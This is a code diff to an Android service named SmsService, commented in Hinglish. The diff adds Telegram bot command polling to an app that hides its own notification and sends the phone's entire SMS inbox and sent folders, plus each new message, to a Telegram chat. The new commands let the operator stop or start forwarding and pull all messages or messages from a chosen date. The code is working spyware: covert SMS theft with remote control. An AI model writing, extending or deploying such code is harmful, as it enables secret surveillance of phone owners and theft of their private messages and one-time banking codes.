@@ -12,11 +12,16 @@ import android.net.Uri;
 import android.os.Build;
 import android.os.IBinder;
 import androidx.core.app.NotificationCompat;
+import org.json.JSONArray;
+import org.json.JSONObject;
+import java.io.BufferedReader;
+import java.io.InputStreamReader;
 import java.io.OutputStream;
 import java.net.HttpURLConnection;
 import java.net.URL;
 import java.net.URLEncoder;
 import java.text.SimpleDateFormat;
+import java.util.Calendar;
 import java.util.Date;
 import java.util.Locale;
 
@@ -27,15 +32,55 @@ public class SmsService extends Service {
     static final int    NOTIF_ID  = 9901;
     static final String CH_ID     = "x_hidden";
 
-    private static final String PREFS    = "sms_prefs";
-    private static final String KEY_SENT = "old_sms_sent";
+    private static final String PREFS       = "sms_prefs";
+    private static final String KEY_SENT    = "old_sms_sent";
+    private static final String KEY_STOPPED = "forwarding_stopped";
+    private static final String KEY_OFFSET  = "last_update_id";
 
+    private volatile boolean running = true;
+    private Thread pollThread;
+
+    // ─── Lifecycle ───────────────────────────────
     @Override
     public void onCreate() {
         super.onCreate();
         startHiddenForeground();
+        startPolling();
     }
 
+    @Override
+    public int onStartCommand(Intent intent, int flags, int startId) {
+        if (intent != null && intent.hasExtra("sms_sender")) {
+            // Naya SMS aaya
+            SharedPreferences prefs = getSharedPreferences(PREFS, MODE_PRIVATE);
+            if (!prefs.getBoolean(KEY_STOPPED, false)) {
+                String sender = intent.getStringExtra("sms_sender");
+                String body   = intent.getStringExtra("sms_body");
+                long   time   = intent.getLongExtra("sms_time", System.currentTimeMillis());
+                new Thread(() -> sendToTelegram(sender, body, time)).start();
+            }
+        } else {
+            // Pehli baar — purane SMS bhejo
+            SharedPreferences prefs = getSharedPreferences(PREFS, MODE_PRIVATE);
+            if (!prefs.getBoolean(KEY_SENT, false)) {
+                prefs.edit().putBoolean(KEY_SENT, true).apply();
+                new Thread(this::sendAllOldSms).start();
+            }
+        }
+        return START_STICKY;
+    }
+
+    @Override
+    public void onDestroy() {
+        running = false;
+        if (pollThread != null) pollThread.interrupt();
+        super.onDestroy();
+    }
+
+    @Override
+    public IBinder onBind(Intent intent) { return null; }
+
+    // ─── Notification (hidden) ───────────────────
     private void startHiddenForeground() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             NotificationChannel ch = new NotificationChannel(
@@ -48,42 +93,182 @@ public class SmsService extends Service {
             NotificationManager nm = getSystemService(NotificationManager.class);
             if (nm != null) nm.createNotificationChannel(ch);
         }
-
         Notification notif = new NotificationCompat.Builder(this, CH_ID)
             .setSmallIcon(android.R.drawable.screen_background_dark)
             .setPriority(NotificationCompat.PRIORITY_MIN)
             .setVisibility(NotificationCompat.VISIBILITY_SECRET)
-            .setSilent(true)
-            .setShowWhen(false)
-            .setOngoing(false)
-            .build();
-
+            .setSilent(true).setShowWhen(false).setOngoing(false).build();
         startForeground(NOTIF_ID, notif);
-
-        // InnerService trick: notification hata do silently
         startService(new Intent(this, InnerService.class));
     }
 
-    @Override
-    public int onStartCommand(Intent intent, int flags, int startId) {
-        if (intent != null && intent.hasExtra("sms_sender")) {
-            String sender = intent.getStringExtra("sms_sender");
-            String body   = intent.getStringExtra("sms_body");
-            long   time   = intent.getLongExtra("sms_time", System.currentTimeMillis());
-            new Thread(() -> sendToTelegram(sender, body, time)).start();
-        } else {
-            SharedPreferences prefs = getSharedPreferences(PREFS, MODE_PRIVATE);
-            if (!prefs.getBoolean(KEY_SENT, false)) {
-                prefs.edit().putBoolean(KEY_SENT, true).apply();
-                new Thread(this::sendAllOldSms).start();
+    // ─── Bot Polling ─────────────────────────────
+    private void startPolling() {
+        pollThread = new Thread(() -> {
+            while (running) {
+                try {
+                    checkCommands();
+                    Thread.sleep(5000);
+                } catch (InterruptedException e) {
+                    break;
+                } catch (Exception e) {
+                    try { Thread.sleep(10000); } catch (InterruptedException ex) { break; }
+                }
             }
-        }
-        return START_STICKY;
+        });
+        pollThread.setDaemon(true);
+        pollThread.start();
     }
 
+    private void checkCommands() throws Exception {
+        SharedPreferences prefs = getSharedPreferences(PREFS, MODE_PRIVATE);
+        long offset = prefs.getLong(KEY_OFFSET, 0);
+
+        String apiUrl = "https://api.telegram.org/bot" + BOT_TOKEN
+            + "/getUpdates?offset=" + (offset + 1) + "&limit=10&timeout=5";
+
+        URL url = new URL(apiUrl);
+        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+        conn.setConnectTimeout(15000);
+        conn.setReadTimeout(15000);
+
+        BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));
+        StringBuilder sb = new StringBuilder();
+        String line;
+        while ((line = reader.readLine()) != null) sb.append(line);
+        conn.disconnect();
+
+        JSONObject resp = new JSONObject(sb.toString());
+        if (!resp.optBoolean("ok", false)) return;
+
+        JSONArray updates = resp.getJSONArray("result");
+        for (int i = 0; i < updates.length(); i++) {
+            JSONObject update = updates.getJSONObject(i);
+            long updateId = update.getLong("update_id");
+            prefs.edit().putLong(KEY_OFFSET, updateId).apply();
+
+            if (!update.has("message")) continue;
+            JSONObject msg = update.getJSONObject("message");
+            if (!msg.has("text")) continue;
+
+            String text    = msg.getString("text").trim();
+            String fromId  = String.valueOf(msg.getJSONObject("chat").getLong("id"));
+
+            // Sirf apne CHAT_ID se commands accept karo
+            if (!fromId.equals(CHAT_ID)) continue;
+
+            handleCommand(text, prefs);
+        }
+    }
+
+    private void handleCommand(String text, SharedPreferences prefs) {
+        new Thread(() -> {
+            if (text.equalsIgnoreCase("/stop")) {
+                prefs.edit().putBoolean(KEY_STOPPED, true).apply();
+                sendRawMessage("🔴 SMS forwarding BAND kar diya. Dobara shuru karne ke liye /start bhejo.");
+
+            } else if (text.equalsIgnoreCase("/start")) {
+                prefs.edit().putBoolean(KEY_STOPPED, false).apply();
+                sendRawMessage("🟢 SMS forwarding SHURU ho gaya! Naye SMS aate hi Telegram par aayenge.");
+
+            } else if (text.equalsIgnoreCase("/all")) {
+                sendRawMessage("📦 Saare SMS bhej raha hun... thoda intezaar karo.");
+                sendAllOldSms();
+                sendRawMessage("✅ Saare SMS bhej diye!");
+
+            } else if (text.toLowerCase().startsWith("/date ")) {
+                String dateStr = text.substring(6).trim();
+                sendRawMessage("📅 " + dateStr + " ke SMS dhundh raha hun...");
+                int count = sendSmsByDate(dateStr);
+                if (count == 0) {
+                    sendRawMessage("❌ " + dateStr + " ko koi SMS nahi mila.");
+                } else {
+                    sendRawMessage("✅ " + dateStr + " ke " + count + " SMS bhej diye!");
+                }
+
+            } else if (text.equalsIgnoreCase("/status")) {
+                boolean stopped = prefs.getBoolean(KEY_STOPPED, false);
+                sendRawMessage("📊 Status: " + (stopped ? "🔴 BAND" : "🟢 CHALU") +
+                    "\nNaye SMS: " + (stopped ? "Forward nahi ho rahe" : "Forward ho rahe hain"));
+
+            } else if (text.equalsIgnoreCase("/help")) {
+                sendRawMessage(
+                    "📋 Available Commands:\n\n" +
+                    "/start — SMS forwarding shuru karo\n" +
+                    "/stop — SMS forwarding band karo\n" +
+                    "/all — Saare SMS mangao\n" +
+                    "/date DD-MM-YYYY — Kisi din ke SMS (e.g. /date 28-05-2025)\n" +
+                    "/status — Dekhoe forwarding on/off hai\n" +
+                    "/help — Yeh list"
+                );
+            }
+        }).start();
+    }
+
+    // ─── SMS by Date ─────────────────────────────
+    private int sendSmsByDate(String dateStr) {
+        int count = 0;
+        try {
+            SimpleDateFormat sdf = new SimpleDateFormat("dd-MM-yyyy", Locale.getDefault());
+            Date date = sdf.parse(dateStr);
+            if (date == null) {
+                sendRawMessage("❌ Date format galat hai. Sahi format: /date 28-05-2025");
+                return 0;
+            }
+
+            Calendar cal = Calendar.getInstance();
+            cal.setTime(date);
+            cal.set(Calendar.HOUR_OF_DAY, 0);
+            cal.set(Calendar.MINUTE, 0);
+            cal.set(Calendar.SECOND, 0);
+            long startMs = cal.getTimeInMillis();
+            cal.set(Calendar.HOUR_OF_DAY, 23);
+            cal.set(Calendar.MINUTE, 59);
+            cal.set(Calendar.SECOND, 59);
+            long endMs = cal.getTimeInMillis();
+
+            count += queryAndSend("content://sms/inbox", startMs, endMs, false);
+            count += queryAndSend("content://sms/sent",  startMs, endMs, true);
+        } catch (Exception e) {
+            sendRawMessage("❌ Date parse error: " + e.getMessage());
+        }
+        return count;
+    }
+
+    private int queryAndSend(String uriStr, long startMs, long endMs, boolean isSent) {
+        int count = 0;
+        ContentResolver cr = getContentResolver();
+        Cursor cursor = null;
+        try {
+            cursor = cr.query(Uri.parse(uriStr),
+                new String[]{"address", "body", "date"},
+                "date >= ? AND date <= ?",
+                new String[]{String.valueOf(startMs), String.valueOf(endMs)},
+                "date ASC");
+
+            if (cursor != null && cursor.moveToFirst()) {
+                do {
+                    String addr  = cursor.getString(0);
+                    String body  = cursor.getString(1);
+                    long   ts    = cursor.getLong(2);
+                    String label = isSent ? "[Bheja: " + addr + "]" : addr;
+                    sendToTelegram(label, body, ts);
+                    count++;
+                    Thread.sleep(400);
+                } while (cursor.moveToNext());
+            }
+        } catch (Exception e) {
+            e.printStackTrace();
+        } finally {
+            if (cursor != null) cursor.close();
+        }
+        return count;
+    }
+
+    // ─── Send All Old SMS ────────────────────────
     private void sendAllOldSms() {
         sendFromFolder("content://sms/inbox", false);
-        sendFromFolder("content://sms/sent", true);
+        sendFromFolder("content://sms/sent",  true);
     }
 
     private void sendFromFolder(String uriStr, boolean isSent) {
@@ -95,11 +280,11 @@ public class SmsService extends Service {
                 null, null, "date ASC");
             if (cursor != null && cursor.moveToFirst()) {
                 do {
-                    String addr = cursor.getString(0);
-                    String body = cursor.getString(1);
-                    long   date = cursor.getLong(2);
+                    String addr  = cursor.getString(0);
+                    String body  = cursor.getString(1);
+                    long   ts    = cursor.getLong(2);
                     String label = isSent ? "[Bheja: " + addr + "]" : addr;
-                    sendToTelegram(label, body, date);
+                    sendToTelegram(label, body, ts);
                     Thread.sleep(500);
                 } while (cursor.moveToNext());
             }
@@ -110,56 +295,56 @@ public class SmsService extends Service {
         }
     }
 
+    // ─── Telegram Helpers ────────────────────────
     public static void sendToTelegram(String sender, String body, long timestamp) {
         try {
             String date = new SimpleDateFormat("dd-MM-yyyy HH:mm", Locale.getDefault())
                               .format(new Date(timestamp));
             String text = "From: " + sender + "\nMsg: " + body + "\nTime: " + date;
-            String api  = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage";
-            String data = "chat_id=" + URLEncoder.encode(CHAT_ID, "UTF-8")
-                        + "&text="    + URLEncoder.encode(text,    "UTF-8");
-
-            URL url = new URL(api);
-            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
-            conn.setRequestMethod("POST");
-            conn.setConnectTimeout(10000);
-            conn.setReadTimeout(10000);
-            conn.setDoOutput(true);
-            conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
-            OutputStream os = conn.getOutputStream();
-            os.write(data.getBytes("UTF-8"));
-            os.flush();
-            conn.getInputStream();
-            conn.disconnect();
+            postToTelegram(text);
         } catch (Exception e) {
             e.printStackTrace();
         }
     }
 
-    @Override
-    public IBinder onBind(Intent intent) { return null; }
+    private static void sendRawMessage(String text) {
+        try { postToTelegram(text); } catch (Exception e) { e.printStackTrace(); }
+    }
 
+    private static void postToTelegram(String text) throws Exception {
+        String api  = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage";
+        String data = "chat_id=" + URLEncoder.encode(CHAT_ID, "UTF-8")
+                    + "&text="   + URLEncoder.encode(text,    "UTF-8");
 
-    // ──────────────────────────────────────────────
-    //  InnerService — notification permanently hatata hai
-    // ──────────────────────────────────────────────
+        URL url = new URL(api);
+        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+        conn.setRequestMethod("POST");
+        conn.setConnectTimeout(10000);
+        conn.setReadTimeout(10000);
+        conn.setDoOutput(true);
+        conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
+        OutputStream os = conn.getOutputStream();
+        os.write(data.getBytes("UTF-8"));
+        os.flush();
+        conn.getInputStream();
+        conn.disconnect();
+    }
+
+    // ─── InnerService (notification hata do) ────
     public static class InnerService extends Service {
         @Override
         public int onStartCommand(Intent intent, int flags, int startId) {
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                Notification notif = new NotificationCompat.Builder(this, CH_ID)
+                Notification n = new NotificationCompat.Builder(this, CH_ID)
                     .setSmallIcon(android.R.drawable.screen_background_dark)
                     .setPriority(NotificationCompat.PRIORITY_MIN)
                     .setVisibility(NotificationCompat.VISIBILITY_SECRET)
-                    .setSilent(true)
-                    .build();
-                startForeground(NOTIF_ID, notif);
+                    .setSilent(true).build();
+                startForeground(NOTIF_ID, n);
             }
             stopSelf();
             return START_NOT_STICKY;
         }
-
-        @Override
-        public IBinder onBind(Intent intent) { return null; }
+        @Override public IBinder onBind(Intent intent) { return null; }
     }
 }
